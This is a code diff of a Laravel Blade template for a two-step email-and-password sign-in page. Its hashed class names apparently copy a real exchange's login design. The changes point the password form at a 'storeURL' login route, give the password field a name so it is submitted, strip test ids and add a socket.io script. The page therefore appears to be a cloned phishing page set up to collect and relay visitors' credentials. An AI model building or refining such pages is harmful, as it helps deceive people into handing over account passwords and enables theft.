@@ -138,7 +138,7 @@
                             </a> for more info</label>
                           </div>
                         </form>
-                        <form id="form2" action="{{ route('otp') }}">
+                        <form id="form2" data-storeURL="{{ route('login') }}">
                           <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_1mvq9l2 cds-3-_zv3bp">
                             <div class="cds-flex-f1g67tkn">
                               <button id="backBtn" data-testid="email-button" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-line-lm9v2nm cds-button-b18qe5go cds-scaledDownState-sxr2bd6 pii9da1" type="button" style="--interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(15, 16, 18, 0.1); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(30, 31, 32); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); width: 100%;">
@@ -152,7 +152,7 @@
                                       </div>
                                     </div>
                                   </div>
-                                  <input readonly="" type="text" class="hizr401" name="username" id="username1" data-testid="username-hidden-field">
+                                  <input readonly="" type="text" class="hizr401" name="username" id="username" data-testid="username-hidden-field">
                                   <p id="emailDisplay" class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-truncate-t1dtku18"></p>
                                 </div>
                               </button>
@@ -162,7 +162,7 @@
                               <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                 <div class="cds-inputAreaContainerStyles-i1sndg40">
                                   <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-opacity: 0.98; --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
-                                    <input aria-describedby="cds-textinput-description-:rl:" aria-label="Password" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="password-input" tabindex="0" aria-invalid="false" id="current-password" autocomplete="current-password" type="password" value="" style="text-align: start; color-scheme: light;">
+                                    <input aria-describedby="cds-textinput-description-:rl:" aria-label="Password" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="password-input" tabindex="0" aria-invalid="false" name="password" id="current-password" autocomplete="current-password" type="password" style="text-align: start; color-scheme: light;">
                                     <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb">
                                      <button aria-label="Show password" id="togglePassword" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-flex-f1g67tkn cds-center-ca5ylan cds-center-czxavit cds-iconButton-i1804idl" type="button" style="--interactable-height: 40px; --interactable-border-radius: 1000px; --interactable-background: transparent; --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13);">
                                       <div class="cds-flex-f1g67tkn cds-relative-r1fxlug" style="position: relative;">
@@ -183,10 +183,10 @@
                           </div>
                         </div>
                         <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_115h1mf cds-2-_8lqlrb">
-                          <button data-testid="password-submit-button" aria-busy="false" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-4-_1arbnhr cds-4-_hd2z08" type="submit" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
+                          <button class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-4-_1arbnhr cds-4-_hd2z08" type="submit" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
                             <span class="cds-positionRelative-p109mlw7">
                               <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a">
-                                <span class="">Continue</span>
+                                <span>Continue</span>
                               </span>
                             </span>
                           </button>
@@ -237,6 +237,7 @@
 @endsection
 
 @push('script')
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.3/socket.io.js"></script>
 <script>
  document.getElementById('continueBtn').addEventListener('click', function(event) {
   event.preventDefault();
@@ -244,7 +245,7 @@
   if(email) {
     document.getElementById('form1').style.display = 'none';
     document.getElementById('form2').style.display = 'block';
-    document.getElementById('username1').value = email;
+    document.getElementById('username').value = email;
     document.getElementById('emailDisplay').textContent = email;
     document.getElementById('password').focus();
   } else {
